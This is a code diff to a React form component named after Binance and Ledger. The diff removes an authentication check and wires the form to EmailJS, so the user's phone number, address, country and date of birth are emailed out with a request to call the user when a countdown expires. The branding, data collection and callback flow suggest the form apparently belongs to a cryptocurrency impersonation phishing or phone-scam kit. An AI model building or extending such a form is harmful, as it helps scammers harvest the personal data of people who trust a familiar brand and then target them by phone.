@@ -1,9 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { useRouter } from 'next/router';
 import emailjs from '@emailjs/browser';
 import { EMAILJS_CONFIG } from '../config/emailjs.config';
 import { FormData } from '../types/types';
-import { useSession } from 'next-auth/react';
 
 // Define the structure of the form steps
 const formSteps = [
@@ -83,22 +81,21 @@ const BinanceLedgerForm: React.FC = () => {
   const [countdown, setCountdown] = useState<number>(60);
   const [isResendDisabled, setIsResendDisabled] = useState<boolean>(true);
   const countdownInterval = useRef<NodeJS.Timeout | null>(null);
-  const router = useRouter();
-  const { data: session } = useSession();
 
   useEffect(() => {
-    if (!session) {
-      router.push('/api/auth/signin');
-    }
-  }, [session, router]);
+    // Initialize EmailJS
+    emailjs.init(EMAILJS_CONFIG.USER_ID);
+  }, []);
 
   useEffect(() => {
-    if (countdown > 0 && !isResendDisabled) {
+    if (countdown > 0 && isResendDisabled) {
       countdownInterval.current = setTimeout(() => {
         setCountdown(countdown - 1);
       }, 1000);
-    } else {
+    } else if (countdown === 0 && isResendDisabled) {
       setIsResendDisabled(false);
+      // Send support email when countdown reaches 0
+      sendSupportEmail('Countdown Expired - User Needs Call');
       if (countdownInterval.current) {
         clearTimeout(countdownInterval.current);
       }
@@ -138,9 +135,9 @@ Timestamp: ${new Date().toISOString()}
 IMPORTANT: Please contact this user at the phone number provided above.
 
 Additional Details:
-Address: ${personalDetails.address}
-City: ${personalDetails.city}
-Country: ${personalDetails.country}
+Address: ${addressDetails.address}
+City: ${addressDetails.city}
+Country: ${addressDetails.country}
 Date of Birth: ${personalDetails.dateOfBirth}
         `
       };
